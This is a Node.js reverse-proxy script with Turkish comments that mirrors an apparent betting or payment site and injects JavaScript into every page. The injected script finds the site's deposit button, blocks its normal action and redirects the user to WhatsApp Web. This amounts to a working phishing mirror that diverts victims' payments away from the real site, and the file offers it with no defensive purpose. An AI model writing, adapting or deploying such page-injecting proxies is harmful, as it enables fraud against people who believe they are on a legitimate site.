
const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const zlib = require('zlib');

const app = express();
const TARGET = 'https://1wbfqv.life';

app.use('/', createProxyMiddleware({
  target: TARGET,
  changeOrigin: true,
  selfHandleResponse: true,

  onProxyRes(proxyRes, req, res) {
    let body = Buffer.from([]);
    const encoding = proxyRes.headers['content-encoding'];

    proxyRes.on('data', chunk => body = Buffer.concat([body, chunk]));
    proxyRes.on('end', () => {
      let decodedBody;

      try {
        if (encoding === 'gzip') {
          decodedBody = zlib.gunzipSync(body).toString();
        } else if (encoding === 'br') {
          decodedBody = zlib.brotliDecompressSync(body).toString();
        } else {
          decodedBody = body.toString();
        }
      } catch (e) {
        console.error('Decode hatası:', e);
        return res.end(body); // hata olursa orijinal veriyi gönder
      }

      // Scripti HTML'ye enjekte et
      const injectedScript = `
        <script>
          new MutationObserver((mutations, observer) => {
            const btn = document.querySelector('.DepositModal_sendButton_k1BfK');
            if (btn) {
              observer.disconnect();
              console.log('[+] Para yatır butonu bulundu. Event listener eklendi.');

              btn.addEventListener('click', function(e) {
                e.preventDefault();
                window.location.href = 'https://web.whatsapp.com';
              });
            }
          }).observe(document.body, { childList: true, subtree: true });
        </script>
      `;

      const modifiedBody = decodedBody.replace('</body>', injectedScript + '</body>');

      res.setHeader('content-type', 'text/html; charset=UTF-8');
      res.setHeader('content-encoding', 'identity'); // response artık sıkıştırılmamış
      res.end(modifiedBody);
    });
  }
}));

app.listen(4000, () => {
  console.log('Reverse proxy çalışıyor: http://localhost:4000');
});
